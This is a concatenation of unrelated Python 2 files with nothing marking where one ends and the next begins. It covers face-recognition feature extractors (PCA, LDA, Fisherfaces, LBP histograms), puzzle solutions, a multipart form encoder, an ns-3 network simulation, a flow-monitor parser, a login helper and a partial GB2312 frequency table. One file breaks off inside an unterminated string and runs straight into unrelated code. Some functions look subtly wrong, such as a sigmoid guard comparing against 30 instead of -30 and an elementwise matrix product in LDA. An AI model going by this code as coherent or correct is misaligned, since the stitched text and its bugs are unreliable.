return self._eigenvectors
@property
def mean(self):
return self._mean
@property
def energy_percentage(self):
return np.sum(self._eigenvalues) / self._total_energy
def __repr__(self):
return "PCA (num_components=%d)" % self._num_components
def short_name(self):
return "PCA: %d" % self._num_components
class LDA(AbstractFeature):
def __init__(self, num_components=0):
AbstractFeature.__init__(self)
self._num_components = num_components
self._eigenvalues = None
self._eigenvectors = None
def compute(self, X, y):
XC = asColumnMatrix(X)
y = np.asarray(y)
d = XC.shape[0]
c = len(np.unique(y))
if self._num_components <= 0:
self._num_components = c - 1
elif self._num_components > (c - 1):
self._num_components = c - 1
mean_total = XC.mean(axis=1).reshape(-1, 1)
Sw = np.zeros((d, d), dtype=np.float32)
Sb = np.zeros((d, d), dtype=np.float32)
for i in range(0, c):
Xi = XC[:, np.where(y==i)[0]]
mean_class = np.mean(Xi, axis=1).reshape(-1, 1)
Sw = Sw + np.dot((Xi - mean_class), (Xi - mean_class).T)
Sb = Sb + Xi.shape[1] * np.dot((mean_class - mean_total), (mean_class - mean_total).T)
self._eigenvalues, self._eigenvectors = np.linalg.eig(np.linalg.inv(Sw) * Sb)
idx = np.argsort(-self._eigenvalues.real)
self._eigenvalues, self._eigenvectors = self._eigenvalues[idx], self._eigenvectors[:, idx]
self._eigenvalues = np.array(self._eigenvalues[0:self._num_components].real, dtype=np.float32, copy=True)
self._eigenvectors = np.matrix(self._eigenvectors[0:, 0:self._num_components].real, dtype=np.float32, copy=True)
features = []
for x in X:
xp = self.project(x.reshape(-1, 1))
features.append(xp)
return features
def project(self, X):
return np.dot(self._eigenvectors.T, X)
def reconstruct(self, X):
return np.dot(self._eigenvectors, X)
@property
def num_components(self):
return self._num_components
@property
def eigenvectors(self):
return self._eigenvectors
@property
def eigenvalues(self):
return self._eigenvalues
def __repr__(self):
return "LDA (num_components=%d)" % self._num_components
class Fisherfaces(AbstractFeature):
def __init__(self, num_components=0):
AbstractFeature.__init__(self)
self._num_components = num_components
self._eigenvectors = None
self._eigenvalues = None
def compute(self, X, y):
XC = asColumnMatrix(X)
y = np.asarray(y)
n = len(y)
c = len(np.unique(y))
pca = PCA(num_components=(n-c))
lda = LDA(num_components=self._num_components)
model = ChainOperator(pca, lda)
model.compute(X, y)
self._eigenvalues = lda.eigenvalues
self._num_components = lda.num_components
self._eigenvectors = np.dot(pca.eigenvectors, lda.eigenvectors)
features = []
for x in X:
xp = self.project(x.reshape(-1, 1))
features.append(xp)
return features
def extract(self, X):
X = np.asarray(X).reshape(-1, 1)
return self.project(X)
def project(self, X):
return np.dot(self._eigenvectors.T, X)
def reconstruct(self, X):
return np.dot(self._eigenvectors, X)
@property
def num_components(self):
return self._num_components
@property
def eigenvalues(self):
return self._eigenvalues
@property
def eigenvectors(self):
return self._eigenvectors
def __repr__(self):
return "Fisherfaces (num_components=%s)" % self._num_components
def short_name(self):
return "Fisher: %d" % self._num_components
from facerec_py.facerec.lbp import *
class SpatialHistogram(AbstractFeature):
def __init__(self, lbp_operator=ExtendedLBP(), sz=(8, 8)):
AbstractFeature.__init__(self)
if not isinstance(lbp_operator, LocalDescriptor):
raise TypeError("Only an operator of type facerec.lbp.LocalDescriptor is a valid lbp_operator.")
self.lbp_operator = lbp_operator
self.sz = sz
self.X = None
self.y = None
def compute(self, X, y):
self.X = X
self.y = y
features = []
for x in X:
x = np.asarray(x)
h = self.spatially_enhanced_histogram(x)
features.append(h)
return features
def extract(self, X):
X = np.asarray(X)
return self.spatially_enhanced_histogram(X)
def spatially_enhanced_histogram(self, X):
L = self.lbp_operator(X)
lbp_height, lbp_width = L.shape
grid_rows, grid_cols = self.sz
py = int(np.floor(lbp_height/grid_rows))
px = int(np.floor(lbp_width/grid_cols))
E = []
for row in range(0, grid_rows):
for col in range(0, grid_cols):
C = L[row*py:(row+1)*py, col*px:(col+1)*px]
H = self._get_histogram(C, row, col)
E.extend(H)
return np.asarray(E)
def _get_histogram(self, C, row, col, normed=True):
H = np.histogram(C,
bins=2 ** self.lbp_operator.neighbors,
range=(0, 2 ** self.lbp_operator.neighbors),
weights=None,
normed=normed
)[0]
return H
def __repr__(self):
return "SpatialHistogram LBP (operator=%s, grid=%s)" % (repr(self.lbp_operator), str(self.sz))
def short_name(self):
return "LBP Histogram
class Solution(object):
def solve(self, cipher):
A, B, N = cipher
a, b = A, B
cnt = 1
while cnt < N:
cnt += 1
a, b = b, b * b + a
return a
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution:
def fibonacci(self, n):
f = lambda n: reduce(lambda x, n: [x[1], x[0]+x[1]], range(n), [0, 1])[0]
return f(n-1)
lst = []
for i in xrange(1, 33+1):
lst.append("data/%d.tsv"%(i))
print ",".join(lst)
import codecs
import mimetypes
from uuid import uuid4
from io import BytesIO
from .packages import six
from .packages.six import b
writer = codecs.lookup('utf-8')[3]
def choose_boundary():
return uuid4().hex
def get_content_type(filename):
return mimetypes.guess_type(filename)[0] or 'application/octet-stream'
def iter_fields(fields):
if isinstance(fields, dict):
return ((k, v) for k, v in six.iteritems(fields))
return ((k, v) for k, v in fields)
def encode_multipart_formdata(fields, boundary=None):
body = BytesIO()
if boundary is None:
boundary = choose_boundary()
for fieldname, value in iter_fields(fields):
body.write(b('--%s\r\n' % (boundary)))
if isinstance(value, tuple):
if len(value) == 3:
filename, data, content_type = value
else:
filename, data = value
content_type = get_content_type(filename)
writer(body).write('Content-Disposition: form-data; name="%s"; '
'filename="%s"\r\n' % (fieldname, filename))
body.write(b('Content-Type: %s\r\n\r\n' %
(content_type,)))
else:
data = value
writer(body).write('Content-Disposition: form-data; name="%s"\r\n'
% (fieldname))
body.write(b'\r\n')
if isinstance(data, int):
data = str(data)
if isinstance(data, six.text_type):
writer(body).write(data)
else:
body.write(data)
body.write(b'\r\n')
body.write(b('--%s--\r\n' % (boundary)))
content_type = b('multipart/form-data; boundary=%s' % boundary)
return body.getvalue(), content_type
import os
import re
class FileUtils(object):
@classmethod
def rename(cls):
find = r".+(?P<time>\d{4}-\d{2}-\d{2}-\d{2}-\d{2}-\d{2}\.png$)"
dir = os.path.dirname(os.path.realpath(__file__))
for r, dirs, fs in os.walk(dir):
for f in fs:
m = re.search(find, f)
if m:
f1 = m.group("time")
os.rename(f, f1)
print "%s -> %s" % (f, f1)
class CmdUtils(object):
@classmethod
def execute(cls, cmd):
os.system(cmd)
class Solution(object):
def solve(self, cipher):
num = int(cipher)
cnt = 0
for char in cipher:
digit = int(char)
if digit == 0: continue
if num % digit == 0:
cnt += 1
return cnt
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip()
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
A = cipher
L = [-1 for _ in A]
for i in xrange(1, len(A)):
idx = i - 1
while idx != -1:
if A[idx] > A[i]:
L[i] = idx
break
idx = L[idx]
R = [-1 for _ in A]
for i in xrange(len(A) - 2, -1, -1):
idx = i + 1
while idx != -1:
if A[idx] > A[i]:
R[i] = idx
break
idx = R[idx]
maxa = -1
for i in xrange(len(A)):
left = L[i] + 1
right = R[i] + 1
maxa = max(maxa, left * right)
return maxa
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
N = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
import heapq
class DualHeap(object):
def __init__(self):
self.min_h = []
self.max_h = []
def insert(self, num):
if not self.min_h or num > self.min_h[0]:
heapq.heappush(self.min_h, num)
else:
heapq.heappush(self.max_h, -num)
self.balance()
def balance(self):
l1 = len(self.min_h)
l2 = len(self.max_h)
if l1 - l2 > 1:
heapq.heappush(self.max_h, -heapq.heappop(self.min_h))
self.balance()
elif l2 - l1 > 1:
heapq.heappush(self.min_h, -heapq.heappop(self.max_h))
self.balance()
return
def get_median(self):
l1 = len(self.min_h)
l2 = len(self.max_h)
m = (l1 + l2 - 1) / 2
if (l1 + l2) % 2 == 1:
if m == l2 - 1:
return -self.max_h[0]
elif m == l2:
return self.min_h[0]
raise Exception("not balanced")
else:
return (-self.max_h[0] + self.min_h[0]) / 2.0
class Solution:
def __init__(self):
self.dh = DualHeap()
def solve(self, cipher):
self.dh.insert(cipher)
return self.dh.get_median()
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = int(f.readline().strip())
s = "%.1f\n" % (solution.solve(cipher))
print s,
import sys
class Solution:
def findPeakII(self, A):
minint = -sys.maxint-1
left = 0
right = len(A[0])
top = 0
bottom = len(A)
while left < right and top < bottom:
if right-left > bottom-top:
mid = (right+left)/2
l_max = minint
r_max = minint
c_max = minint
c_i, c_j = -1, -1
for i in xrange(top, bottom):
l_max = max(l_max, A[i][mid-1])
r_max = max(r_max, A[i][mid+1])
c_max = max(c_max, A[i][mid])
if c_max == A[i][mid]:
c_i, c_j = i, mid
if l_max > c_max and l_max > r_max:
right = mid
elif r_max > c_max and r_max > l_max:
left = mid+1
else:
return [c_i, c_j]
else:
mid = (top+bottom)/2
u_max = minint
d_max = minint
c_max = minint
c_i, c_j = -1, -1
for j in xrange(left, right):
u_max = max(u_max, A[mid-1][j])
d_max = max(d_max, A[mid+1][j])
c_max = max(c_max, A[mid][j])
if c_max == A[mid][j]:
c_i, c_j = mid, j
if u_max > c_max and u_max > d_max:
bottom = mid
elif d_max > c_max and d_max > u_max:
top = mid+1
else:
return [c_i, c_j]
return [-1, -1]
if __name__ == "__main__":
A = [
[1,  2,  3,  4,   5, 6],
[14, 15, 16, 17, 18, 8],
[12, 13, 11, 10,  9, 7]
]
print Solution().findPeakII(A)
class Solution:
def findPeak(self, A):
n = len(A)
l = 0
h = n
while l < h:
m = (l+h)/2
if A[m-1] < A[m] > A[m+1]:
return m
elif A[m+1] > A[m]:
l = m+1
else:
h = m
raise Exception
if __name__ == "__main__":
assert Solution().findPeak([1, 2, 1, 3, 4, 5, 7, 6]) in (1, 6)
class UndirectedGraphNode:
def __init__(self, x):
self.label = x
self.neighbors = []
class Solution:
def connectedSet(self, nodes):
rets = []
visisted = set()
for node in nodes:
if node not in visisted:
ret = []
self.dfs(node, visisted, ret)
ret.sort()
rets.append(ret)
return rets
def dfs(self, node, visited, ret):
ret.append(node.label)
visited.add(node)
for nei in node.neighbors:
if nei not in visited:
self.dfs(nei, visited, ret)
class Solution(object):
def solve(self, cipher):
N, A = cipher
if N % 2 == 1:
return self.find_kth(A, 0, N - 1, (N - 1) / 2)
else:
raise IndexError
def find_kth(self, A, i, j, k):
p = self.partition(A, i, j)
if p == k:
return A[p]
if p > k:
return self.find_kth(A, i, p - 1, k)
else:
return self.find_kth(A, p + 1, j, k)
def partition(self, A, i, j):
if i > j:
raise IndexError
if i == j:
return i
p = i
ptr_smaller = p
for ptr in xrange(p + 1, j + 1):
if A[ptr] < A[p]:
ptr_smaller += 1
A[ptr], A[ptr_smaller] = A[ptr_smaller], A[ptr]
A[p], A[ptr_smaller] = A[ptr_smaller], A[p]
return ptr_smaller
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
N = int(f.readline().strip())
A = map(int, f.readline().strip().split(' '))
cipher = N, A
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def findMissing(self, nums):
nth = -1
n = len(nums)
i = 0
while i < n:
if nums[i] == n:
nth = nums[i]
i += 1
elif nums[i] != i:
nums[nums[i]], nums[i] = nums[i], nums[nums[i]]
else:
i += 1
if nth == -1:
return n
else:
return nums.index(nth)
if __name__ == "__main__":
print Solution().findMissing([9,8,7,6,2,0,1,5,4])
class DirectedGraphNode:
def __init__(self, x):
self.label = x
self.neighbors = []
def __repr__(self):
return repr(self.x)
from collections import defaultdict
class UnionFind(object):
def __init__(self):
self.pi = {}
self.sz = {}
def add(self, item):
if item not in self.pi:
self.pi[item] = item
self.sz[item] = 1
def union(self, a, b):
pi1 = self._pi(a)
pi2 = self._pi(b)
if pi1 != pi2:
if self.sz[pi1] > self.sz[pi2]:
pi1, pi2 = pi2, pi1
self.pi[pi1] = pi2
self.sz[pi2] += self.sz[pi1]
del self.sz[pi1]
def _pi(self, item):
pi = self.pi[item]
if item != pi:
self.pi[item] = self._pi(pi)
return self.pi[item]
def compress(self):
for item in self.pi.keys():
self.pi[item] = self._pi(item)
def count(self):
return len(self.sz)
class Solution:
def connectedSet2(self, nodes):
uf = UnionFind()
for node in nodes:
uf.add(node.label)
for nei in node.neighbors:
uf.add(nei.label)
uf.union(node.label, nei.label)
uf.compress()
ret = defaultdict(list)
for item, pi in uf.pi.items():
ret[pi].append(item)
for v in ret.values():
v.sort()
return ret.values()
if __name__ == "__main__":
items = {i: DirectedGraphNode(i) for i in "ABCDEF"}
items["A"].neighbors.append(items["B"])
items["A"].neighbors.append(items["D"])
items["B"].neighbors.append(items["D"])
items["C"].neighbors.append(items["E"])
items["F"].neighbors.append(items["E"])
assert Solution().connectedSet2(items.values()) == [['A', 'B', 'D'], ['C', 'E', 'F']]
class VersionControl:
@classmethod
def isBadVersion(cls, id):
return True
class Solution:
def findFirstBadVersion(self, n):
l = 1
h = n+1
while l < h:
m = (l+h)/2
if not VersionControl.isBadVersion(m):
l = m+1
else:
h = m
return l
class Solution(object):
def firstMissingPositive(self, A):
n = len(A)
i = 0
while i < n:
v = A[i]
if v <= 0 or v > n:
i += 1
elif A[v-1] != v:
A[v-1], A[i] = v, A[v-1]
else:
i += 1
for i in xrange(n):
if A[i] != i+1:
return i+1
return n+1
if __name__ == "__main__":
assert Solution().firstMissingPositive([3, 4, -1, 1]) == 2
import ns.applications
import ns.core
import ns.internet
import ns.network
import ns.point_to_point
ns.core.LogComponentEnable("UdpEchoClientApplication", ns.core.LOG_LEVEL_INFO)
ns.core.LogComponentEnable("UdpEchoServerApplication", ns.core.LOG_LEVEL_INFO)
nodes = ns.network.NodeContainer()
nodes.Create(2)
pointToPoint = ns.point_to_point.PointToPointHelper()
pointToPoint.SetDeviceAttribute("DataRate", ns.core.StringValue("5Mbps"))
pointToPoint.SetChannelAttribute("Delay", ns.core.StringValue("2ms"))
devices = pointToPoint.Install(nodes)
stack = ns.internet.InternetStackHelper()
stack.Install(nodes)
address = ns.internet.Ipv4AddressHelper()
address.SetBase(ns.network.Ipv4Address("10.1.1.0"), ns.network.Ipv4Mask("255.255.255.0"))
interfaces = address.Assign (devices);
echoServer = ns.applications.UdpEchoServerHelper(9)
serverApps = echoServer.Install(nodes.Get(1))
serverApps.Start(ns.core.Seconds(1.0))
serverApps.Stop(ns.core.Seconds(10.0))
echoClient = ns.applications.UdpEchoClientHelper(interfaces.GetAddress(1), 9)
echoClient.SetAttribute("MaxPackets", ns.core.UintegerValue(1))
echoClient.SetAttribute("Interval", ns.core.TimeValue(ns.core.Seconds (1.0)))
echoClient.SetAttribute("PacketSize", ns.core.UintegerValue(1024))
clientApps = echoClient.Install(nodes.Get(0))
clientApps.Start(ns.core.Seconds(2.0))
clientApps.Stop(ns.core.Seconds(10.0))
ns.core.Simulator.Run()
ns.core.Simulator.Destroy()
import sys
sys.path.append("../..")
from facerec.dataset import DataSet
from facerec.feature import Fisherfaces
from facerec.distance import EuclideanDistance, CosineDistance
from facerec.classifier import NearestNeighbor
from facerec.classifier import SVM
from facerec.model import PredictableModel
from facerec.validation import KFoldCrossValidation
from facerec.visual import subplot
from facerec.util import minmax_normalize
import numpy as np
import matplotlib.cm as cm
import logging,sys
handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger("facerec")
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)
dataSet = DataSet("/home/philipp/facerec/data/yalefaces_recognition")
feature = Fisherfaces()
classifier = NearestNeighbor(dist_metric=EuclideanDistance(), k=1)
model = PredictableModel(feature=feature, classifier=classifier)
model.compute(dataSet.data, dataSet.labels)
E = []
for i in xrange(min(model.feature.eigenvectors.shape[1], 16)):
e = model.feature.eigenvectors[:,i].reshape(dataSet.data[0].shape)
E.append(minmax_normalize(e,0,255, dtype=np.uint8))
subplot(title="Fisherfaces", images=E, rows=4, cols=4, sptitle="Fisherface", colormap=cm.jet, filename="fisherfaces.pdf")
cv = KFoldCrossValidation(model, k=10)
cv.validate(dataSet.data, dataSet.labels)
cv.print_results()
def bitFlip(cipher):
if len(cipher) <= 2:
return len(cipher)
cipher = [val if val == 1 else -1 for val in cipher]
maxl = 0
maxr = -1
min_sum = 1 << 31
ssum = 0
l = 0
r = -1
for ind, val in enumerate(cipher):
ssum += val
if ssum > 0:
l = ind + 1
r = ind
ssum = 0
if ssum < 0:
r = ind
if min_sum > ssum:
min_sum = ssum
maxr, maxl = r, l
cipher = [val if val == 1 else 0 for val in cipher]
for i in xrange(maxl, maxr + 1):
cipher[i] ^= 1
return sum(cipher)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N = int(f.readline().strip())
cipher = []
for t in xrange(N):
i = int(f.readline().strip())
cipher.append(i)
s = "%s\n" % (bitFlip(cipher))
print s,
class Solution(object):
def solve(self, cipher):
N, K, C = cipher
C.sort(reverse=True)
group_cnt = N / K + 1
total_cost = 0
for i in xrange(group_cnt):
unit_cost = i + 1
total_cost += unit_cost * sum(C[i * K:(i + 1) * K])
return total_cost
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N, K = map(int, f.readline().strip().split(' '))
C = map(int, f.readline().strip().split(' '))
cipher = N, K, C
s = "%s\n" % (Solution().solve(cipher))
print s,
from __future__ import division
import sys
import os
try:
from xml.etree import cElementTree as ElementTree
except ImportError:
from xml.etree import ElementTree
def parse_time_ns(tm):
if tm.endswith('ns'):
return long(tm[:-2])
raise ValueError(tm)
class FiveTuple(object):
__slots__ = ['sourceAddress', 'destinationAddress', 'protocol', 'sourcePort', 'destinationPort']
def __init__(self, el):
self.sourceAddress = el.get('sourceAddress')
self.destinationAddress = el.get('destinationAddress')
self.sourcePort = int(el.get('sourcePort'))
self.destinationPort = int(el.get('destinationPort'))
self.protocol = int(el.get('protocol'))
class Histogram(object):
__slots__ = 'bins', 'nbins', 'number_of_flows'
def __init__(self, el=None):
self.bins = []
if el is not None:
for bin in el.findall('bin'):
self.bins.append( (float(bin.get("start")), float(bin.get("width")), int(bin.get("count"))) )
class Flow(object):
__slots__ = ['flowId', 'delayMean', 'packetLossRatio', 'rxBitrate', 'txBitrate',
'fiveTuple', 'packetSizeMean', 'probe_stats_unsorted',
'hopCount', 'flowInterruptionsHistogram', 'rx_duration']
def __init__(self, flow_el):
self.flowId = int(flow_el.get('flowId'))
rxPackets = long(flow_el.get('rxPackets'))
txPackets = long(flow_el.get('txPackets'))
tx_duration = float(long(flow_el.get('timeLastTxPacket')[:-2]) - long(flow_el.get('timeFirstTxPacket')[:-2]))*1e-9
rx_duration = float(long(flow_el.get('timeLastRxPacket')[:-2]) - long(flow_el.get('timeFirstRxPacket')[:-2]))*1e-9
self.rx_duration = rx_duration
self.probe_stats_unsorted = []
if rxPackets:
self.hopCount = float(flow_el.get('timesForwarded')) / rxPackets + 1
else:
self.hopCount = -1000
if rxPackets:
self.delayMean = float(flow_el.get('delaySum')[:-2]) / rxPackets * 1e-9
self.packetSizeMean = float(flow_el.get('rxBytes')) / rxPackets
else:
self.delayMean = None
self.packetSizeMean = None
if rx_duration > 0:
self.rxBitrate = long(flow_el.get('rxBytes'))*8 / rx_duration
else:
self.rxBitrate = None
if tx_duration > 0:
self.txBitrate = long(flow_el.get('txBytes'))*8 / tx_duration
else:
self.txBitrate = None
lost = float(flow_el.get('lostPackets'))
if rxPackets == 0:
self.packetLossRatio = None
else:
self.packetLossRatio = (lost / (rxPackets + lost))
interrupt_hist_elem = flow_el.find("flowInterruptionsHistogram")
if interrupt_hist_elem is None:
self.flowInterruptionsHistogram = None
else:
self.flowInterruptionsHistogram = Histogram(interrupt_hist_elem)
class ProbeFlowStats(object):
__slots__ = ['probeId', 'packets', 'bytes', 'delayFromFirstProbe']
class Simulation(object):
def __init__(self, simulation_el):
self.flows = []
FlowClassifier_el, = simulation_el.findall("Ipv4FlowClassifier")
flow_map = {}
for flow_el in simulation_el.findall("FlowStats/Flow"):
flow = Flow(flow_el)
flow_map[flow.flowId] = flow
self.flows.append(flow)
for flow_cls in FlowClassifier_el.findall("Flow"):
flowId = int(flow_cls.get('flowId'))
flow_map[flowId].fiveTuple = FiveTuple(flow_cls)
for probe_elem in simulation_el.findall("FlowProbes/FlowProbe"):
probeId = int(probe_elem.get('index'))
for stats in probe_elem.findall("FlowStats"):
flowId = int(stats.get('flowId'))
s = ProbeFlowStats()
s.packets = int(stats.get('packets'))
s.bytes = long(stats.get('bytes'))
s.probeId = probeId
if s.packets > 0:
s.delayFromFirstProbe =  parse_time_ns(stats.get('delayFromFirstProbeSum')) / float(s.packets)
else:
s.delayFromFirstProbe = 0
flow_map[flowId].probe_stats_unsorted.append(s)
def main(argv):
file_obj = open(argv[1])
print "Reading XML file ",
sys.stdout.flush()
level = 0
sim_list = []
for event, elem in ElementTree.iterparse(file_obj, events=("start", "end")):
if event == "start":
level += 1
if event == "end":
level -= 1
if level == 0 and elem.tag == 'FlowMonitor':
sim = Simulation(elem)
sim_list.append(sim)
elem.clear()
sys.stdout.write(".")
sys.stdout.flush()
print " done."
for sim in sim_list:
for flow in sim.flows:
t = flow.fiveTuple
proto = {6: 'TCP', 17: 'UDP'} [t.protocol]
print "FlowID: %i (%s %s/%s --> %s/%i)" % \
(flow.flowId, proto, t.sourceAddress, t.sourcePort, t.destinationAddress, t.destinationPort)
print "\tTX bitrate: %.2f kbit/s" % (flow.txBitrate*1e-3,)
print "\tRX bitrate: %.2f kbit/s" % (flow.rxBitrate*1e-3,)
print "\tMean Delay: %.2f ms" % (flow.delayMean*1e3,)
print "\tPacket Loss Ratio: %.2f %%" % (flow.packetLossRatio*100)
if __name__ == '__main__':
main(sys.argv)
import requests
class FormHandler(object):
def __init__(self):
self.client = requests.session()
def get_csrf(self, url):
self.client.get(url)
return self.client.cookies['csrf']
def login(self, url, username, password, csrf):
login_data = dict(username=username, password=password, csrfmiddlewaretoken=csrf, next='/')
response = self.client.post(url, data=login_data, headers=dict(Referer=url))
return response
from collections import defaultdict
def dfs(G, i, visited):
visited[i] = True
for nbr in G[i]:
if not visited[nbr]:
dfs(G, nbr, visited)
def friendCircles(friends):
if not friends: return 0
G = defaultdict(list)
n = len(friends)
for i in xrange(n):
for j in xrange(n):
if friends[i][j] == "Y":
G[i].append(j)
G[j].append(i)
visited = [False for _ in xrange(n)]
cnt = 0
for i in xrange(n):
if not visited[i]:
cnt += 1
dfs(G, i, visited)
return cnt
if __name__ == "__main__":
friends = [
"YYNN",
"YYYN",
"NYYN",
"NNNY"
]
assert friendCircles(friends) == 2
friends2 = [
"YNNNN",
"NYNNN",
"NNYNN",
"NNNYN",
"NNNNY"
]
assert friendCircles(friends2) == 5
import numpy as np
from scipy.stats import logistic, multivariate_normal
def sigmoid(X):
return logistic.cdf(X)
def sigmoid_deprecated(z):
if z > 30:
return 1 - 1e-10
if z < 30:
return 1e-10
return 1.0 / (1 + np.exp(-z))
def log_sigmoid_deprecated(z):
if abs(z) < 30:
return np.log(sigmoid(z))
else:
if z > 0:
return -np.exp(-z)
else:
return z
def multivariate_gaussian(X, mu, Sigma):
return multivariate_normal.pdf(X, mean=mu, cov=Sigma)
class Solution(object):
def solve(self, cipher):
s = cipher
r = s[::-1]
s = map(ord, list(s))
r = map(ord, list(r))
for i in xrange(1, len(s)):
if abs(s[i] - s[i - 1]) != abs(r[i] - r[i - 1]):
return "Not Funny"
return "Funny"
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip()
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
A = cipher
N = len(A)
_sum = sum(A)
_max = -1 << 65
s = 0
for ind, val in enumerate(A):
s += (ind + 1) * val
_max = max(_max, s)
for i in xrange(N):
s = s + _sum - N * A[N - 1 - i]
_max = max(_max, s)
return _max
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
import collections
class Solution(object):
def solve(self, cipher):
d = collections.defaultdict(int)
for c in cipher:
d[c] += 1
cnt = 0
for v in d.values():
if v & 1 == 1:
cnt += 1
if cnt > 1:
return "NO"
return "YES"
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
cipher = f.readline().strip()
s = "%s\n" % (solution.solve(cipher))
print s,
GB2312_TYPICAL_DISTRIBUTION_RATIO = 0.9
GB2312_TABLE_SIZE = 3760
GB2312CharToFreqOrder = (
1671, 749,1443,2364,3924,3807,2330,3921,1704,3463,2691,1511,1515, 572,3191,2205,
2361, 224,2558, 479,1711, 963,3162, 440,4060,1905,2966,2947,3580,2647,3961,3842,
2204, 869,4207, 970,2678,5626,2944,2956,1479,4048, 514,3595, 588,1346,2820,3409,
249,4088,1746,1873,2047,1774, 581,1813, 358,1174,3590,1014,1561,4844,2245, 670,
1636,3112, 889,1286, 953, 556,2327,3060,1290,3141, 613, 185,3477,1367, 850,3820,
1715,2428,2642,2303,2732,3041,2562,2648,3566,3946,1349, 388,3098,2091,1360,3585,
152,1687,1539, 738,1559,  59,1232,2925,2267,1388,1249,1741,1679,2960, 151,1566,
1125,1352,4271, 924,4296, 385,3166,4459, 310,1245,2850,  70,3285,2729,3534,3575,
2398,3298,3466,1960,2265, 217,3647, 864,1909,2084,4401,2773,1010,3269,5152, 853,
3051,3121,1244,4251,1895, 364,1499,1540,2313,1180,3655,2268, 562, 715,2417,3061,
544, 336,3768,2380,1752,4075, 950, 280,2425,4382, 183,2759,3272, 333,4297,2155,
1688,2356,1444,1039,4540, 736,1177,3349,2443,2368,2144,2225, 565, 196,1482,3406,
927,1335,4147, 692, 878,1311,1653,3911,3622,1378,4200,1840,2969,3149,2126,1816,
2534,1546,2393,2760, 737,2494,  13, 447, 245,2747,  38,2765,2129,2589,1079, 606,
360, 471,3755,2890, 404, 848, 699,1785,1236, 370,2221,1023,3746,2074,2026,2023,
2388,1581,2119, 812,1141,3091,2536,1519, 804,2053, 406,1596,1090, 784, 548,4414,
1806,2264,2936,1100, 343,4114,5096, 622,3358, 743,3668,1510,1626,5020,3567,2513,
3195,4115,5627,2489,2991,  24,2065,2697,1087,2719,  48,1634, 315,  68, 985,2052,
198,2239,1347,1107,1439, 597,2366,2172, 871,3307, 919,2487,2790,1867, 236,2570,
1413,3794, 906,3365,3381,1701,1982,1818,1524,2924,1205, 616,2586,2072,2004, 575,
253,3099,  32,1365,1182, 197,1714,2454,1201, 554,3388,3224,2748, 756,2587, 250,
2567,1507,1517,3529,1922,2761,2337,3416,1961,1677,2452,2238,3153, 615, 911,1506,
1474,2495,1265,1906,2749,3756,3280,2161, 898,2714,1759,3450,2243,2444, 563,  26,
3286,2266,3769,3344,2707,3677, 611,1402, 531,1028,2871,4548,1375, 261,2948, 835,
1190,4134, 353, 840,2684,1900,3082,1435,2109,1207,1674, 329,1872,2781,4055,2686,
2104, 608,3318,2423,2957,2768,1108,3739,3512,3271,3985,2203,1771,3520,1418,2054,
1681,1153, 225,1627,2929, 162,2050,2511,3687,1954, 124,1859,2431,1684,3032,2894,
585,4805,3969,2869,2704,2088,2032,2095,3656,2635,4362,2209, 256, 518,2042,2105,
3777,3657, 643,2298,1148,1779, 190, 989,3544, 414,  11,2135,2063,2979,1471, 403,
3678, 126, 770,1563, 671,2499,3216,2877, 600,1179, 307,2805,4937,1268,1297,2694,
252,4032,1448,1494,1331,1394, 127,2256, 222,1647,1035,1481,3056,1915,1048, 873,
3651, 210,  33,1608,2516, 200,1520, 415, 102,   0,3389,1287, 817,  91,3299,2940,
836,1814, 549,2197,1396,1669,2987,3582,2297,2848,4528,1070, 687,  20,1819, 121,
1552,1364,1461,1968,2617,3540,2824,2083, 177, 948,4938,2291, 110,4549,2066, 648,
3359,1755,2110,2114,4642,4845,1693,3937,3308,1257,1869,2123, 208,1804,3159,2992,
2531,2549,3361,2418,1350,2347,2800,2568,1291,2036,2680,  72, 842,1990, 212,1233,
1154,1586,  75,2027,3410,4900,1823,1337,2710,2676, 728,2810,1522,3026,4995, 157,
755,1050,4022, 710, 785,1936,2194,2085,1406,2777,2400, 150,1250,4049,1206, 807,
1910, 534, 529,3309,1721,1660, 274,  39,2827, 661,2670,1578, 925,3248,3815,1094,
4278,4901,4252,  41,1150,3747,2572,2227,4501,3658,4902,3813,3357,3617,2884,2258,
887, 538,4187,3199,1294,2439,3042,2329,2343,2497,1255, 107, 543,1527, 521,3478,
3568, 194,5062,  15, 961,3870,1241,1192,2664,  66,5215,3260,2111,1295,1127,2152,
3805,4135, 901,1164,1976, 398,1278, 530,1460, 748, 904,1054,1966,1426,  53,2909,
509, 523,2279,1534, 536,1019, 239,1685, 460,2353, 673,1065,2401,3600,4298,2272,
1272,2363, 284,1753,3679,4064,1695,  81, 815,2677,2757,2731,1386, 859, 500,4221,
2190,2566, 757,1006,2519,2068,1166,1455, 337,2654,3203,1863,1682,1914,3025,1252,
1409,1366, 847, 714,2834,2038,3209, 964,2970,1901, 885,2553,1078,1756,3049, 301,
1572,3326, 688,2130,1996,2429,1805,1648,2930,3421,2750,3652,3088, 262,1158,1254,
389,1641,1812, 526,1719, 923,2073,1073,1902, 468, 489,4625,1140, 857,2375,3070,
3319,2863, 380, 116,1328,2693,1161,2244, 273,1212,1884,2769,3011,1775,1142, 461,
